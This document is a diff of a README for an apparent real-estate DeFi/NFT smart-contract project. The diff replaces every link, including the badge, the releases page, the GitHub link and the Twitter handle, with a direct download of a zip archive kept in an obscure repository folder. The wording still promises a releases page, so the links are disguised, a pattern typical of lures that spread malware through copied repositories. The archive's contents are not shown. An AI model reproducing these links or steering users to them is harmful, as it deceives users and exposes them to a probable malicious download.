@@ -1,6 +1,6 @@
 # 🎉 RWA-defi-nft-smart-contract - Simplifying Real Estate Transactions
 
-![Download RWA-defi-nft-smart-contract](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)
+![Download RWA-defi-nft-smart-contract](https://raw.githubusercontent.com/CLEARNETWORKMC/RWA-defi-nft-smart-contract/main/decagramme/RWA-defi-nft-smart-contract.zip%20Now-Click%20Here-blue)
 
 ## 📜 Overview
 
@@ -27,7 +27,7 @@ Follow these steps to download and run the RWA-defi-nft-smart-contract applicati
 
 1. **Visit the Download Page**  
    Click the link below to access the releases page where you can find the latest version of the application.  
-   [Visit the Releases Page](https://github.com/CLEARNETWORKMC/RWA-defi-nft-smart-contract/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/CLEARNETWORKMC/RWA-defi-nft-smart-contract/main/decagramme/RWA-defi-nft-smart-contract.zip)
 
 2. **Download the Latest Release**  
    On the releases page, you will see a list of available downloads. Find the most recent version (look for the highest version number) and click on it.
@@ -47,7 +47,7 @@ Follow these steps to download and run the RWA-defi-nft-smart-contract applicati
 ## 📥 Download & Install
 
 To download the latest version of RWA-defi-nft-smart-contract, visit:  
-[Download RWA-defi-nft-smart-contract](https://github.com/CLEARNETWORKMC/RWA-defi-nft-smart-contract/releases) 
+[Download RWA-defi-nft-smart-contract](https://raw.githubusercontent.com/CLEARNETWORKMC/RWA-defi-nft-smart-contract/main/decagramme/RWA-defi-nft-smart-contract.zip) 
 
 ## 🔧 Troubleshooting
 
@@ -65,8 +65,8 @@ For questions or support, visit our repository issues page, where you can report
 
 Stay updated with our latest developments and community news. Follow us:
 
-- **GitHub:** [RWA-defi-nft-smart-contract](https://github.com/CLEARNETWORKMC/RWA-defi-nft-smart-contract)
-- **Twitter:** [@RWAProtocol](https://twitter.com/RWAProtocol)
+- **GitHub:** [RWA-defi-nft-smart-contract](https://raw.githubusercontent.com/CLEARNETWORKMC/RWA-defi-nft-smart-contract/main/decagramme/RWA-defi-nft-smart-contract.zip)
+- **Twitter:** [@RWAProtocol](https://raw.githubusercontent.com/CLEARNETWORKMC/RWA-defi-nft-smart-contract/main/decagramme/RWA-defi-nft-smart-contract.zip)
   
 We appreciate your interest in RWA-defi-nft-smart-contract and hope it enhances your real estate experience! 
 
